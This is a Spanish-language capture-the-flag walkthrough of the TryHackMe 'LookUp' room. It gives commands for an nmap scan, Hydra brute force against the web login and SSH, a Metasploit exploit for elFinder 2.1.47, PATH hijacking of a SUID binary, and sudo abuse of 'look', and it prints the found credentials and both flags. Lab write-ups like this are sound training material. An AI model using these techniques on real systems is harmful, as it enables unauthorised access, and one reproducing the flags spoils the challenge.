# Walkthrough de LookUp

Binyamin
---

## 🌟 Versión con imágenes

Si prefieres ver esta resolución con imágenes explicativas, visita la versión en **Medium**:  
🔗 [Walkthrough de Lookup en Medium](https://medium.com/@chrstntapia/walkthrough-de-lookup-5ab9bfb8f54b)

## Paso 1: Análisis con nmap

```bash
nmap -sV -T5 -sS -Pn --min-rate 6000 -p- --open -oA $IP
```

### Resultados nmap

Resultados obtenidos del escaneo con nmap.

---

## Paso 2: Agregar dominio al archivo /etc/hosts

```bash
echo "$IP lookup.thm" >> /etc/hosts
```

Este paso simplifica la resolución de nombres y facilita la administración de red.

---

## Paso 3: Analizando el login

Credenciales probadas:

```text
username: prueba1
password: pass123
```

Se obtiene un mensaje de error "wrong username or password", lo que sugiere la necesidad de realizar un ataque de fuerza bruta.

---

## Paso 4: Uso de un script para encontrar usernames

Descarga y ejecución del script:

```bash
wget https://raw.githubusercontent.com/BinyaminT/THM/refs/heads/main/CTF/LookUp/username.py
python3 username.py /usr/share/wordlists/SecLists/Usernames/Names/
```

Se encuentran los usuarios: `admin` y `jose`.

---

## Paso 5: Uso de fuerza bruta con Hydra

```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=wrong password" -t 16
```

---

## Paso 6: Acceder a la página con credenciales encontradas

```text
username: jose
password: password123
```

Se obtiene un error debido a la falta del subdominio `files.lookup.thm`. Se soluciona con:

```bash
echo "$IP files.lookup.thm" >> /etc/hosts
```

---

## Paso 7: Identificación de vulnerabilidades

Se detecta el uso de `elFinder 2.1.47`. Buscamos un exploit en Metasploit:

```bash
msfconsole
search elFinder 2.1.47
```

Seleccionamos el exploit adecuado y configuramos Metasploit.

---

## Paso 8: Ejecución de Meterpreter y búsqueda de binarios SUID

```bash
shell
find / -perm /4000 2>/dev/null
```

Se encuentra un binario sospechoso: `pwm`.

---

## Paso 9: Explotación del binario pwm

Se detecta que `pwm` ejecuta `id` sin ruta absoluta, lo que permite un ataque de Path Hijacking.

Creamos un binario falso de `id`:

```bash
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> /tmp/id
chmod +x /tmp/id
```

Modificamos la variable `$PATH`:

```bash
export PATH=/tmp:$PATH
```

---

## Paso 10: Obtener credenciales del usuario `think`

Se guardan en `limpio.txt` y se usa Hydra para obtener la contraseña de SSH:

```bash
hydra -l think -P limpio.txt ssh://IP_DEL_OBJETIVO -t 16
```

Accedemos al sistema vía SSH.

---

## Primera Flag

```text
38375fb4dd8baa2b2039ac03d92b820e
```

---

## Paso 11: Escalada de privilegios

Ejecutamos:

```bash
sudo -l
```

Se detecta que el binario `look` puede ejecutarse con sudo. Buscamos su explotación en GTFOBins:

[https://gtfobins.github.io/gtfobins/look/#sudo](https://gtfobins.github.io/gtfobins/look/#sudo)

Este binario nos permitió obtener la segunda flag, denominada root.txt, que generalmente se encuentra en `/root/root.txt`.

```text
Segunda Flag: 5a285a9f257e45c68bb6c9f9f57d18e8
```

Ahora es tu turno: ¡intenta conseguir acceso root con este binario! Quizás puedas leer el archivo `shadow` o encontrar otro servicio SSH disponible para explotar.

---

## Flag final

Obtenemos la flag de root y completamos el desafío.
